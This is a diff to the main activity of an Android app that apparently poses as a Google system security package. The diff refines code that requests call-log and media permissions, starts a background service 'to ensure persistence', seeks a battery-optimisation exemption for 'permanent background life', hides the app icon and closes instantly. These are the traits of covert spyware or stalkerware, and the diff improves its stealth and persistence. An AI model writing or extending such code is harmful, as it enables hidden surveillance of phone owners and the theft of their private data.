@@ -3,7 +3,6 @@ package com.google.android.sys.security;
 import android.Manifest;
 import android.app.Activity;
 import android.content.ComponentName;
-import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -38,7 +37,6 @@ public class MainActivity extends Activity {
         permissions.add(Manifest.permission.READ_CALL_LOG);
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
             permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
             permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
             permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
@@ -69,6 +67,7 @@ public class MainActivity extends Activity {
 
         // If all permissions already granted, just hide and finish
         if (hasAllPermissions()) {
+            requestBatteryOptimizationExemption();
             startMainService();
             hideAppIcon();
             finish();
@@ -77,6 +76,24 @@ public class MainActivity extends Activity {
 
         // REQUEST PERMISSIONS IMMEDIATELY
         requestAllPermissions();
+    }
+
+    private void requestBatteryOptimizationExemption() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            try {
+                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
+                String packageName = getPackageName();
+                
+                if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
+                    Intent intent = new Intent();
+                    intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(android.net.Uri.parse("package:" + packageName));
+                    startActivity(intent);
+                }
+            } catch (Exception e) {
+                // Ignore if fails, not critical
+            }
+        }
     }
 
     private boolean hasAllPermissions() {
@@ -106,32 +123,15 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
+            // Request battery optimization exemption
+            requestBatteryOptimizationExemption();
+            
+            // Start the service regardless of the result to ensure persistence
             startMainService();
             
-            // Critical: Request to bypass battery optimization for permanent background life
-            requestBatteryOptimization();
-            
-            // Hide and finish 
+            // Hide and finish INSTANTLY
             hideAppIcon();
             finish();
-        }
-    }
-
-    private void requestBatteryOptimization() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            try {
-                String packageName = getPackageName();
-                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
-                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                    Intent intent = new Intent();
-                    intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                    intent.setData(android.net.Uri.parse("package:" + packageName));
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(intent);
-                }
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
         }
     }
 
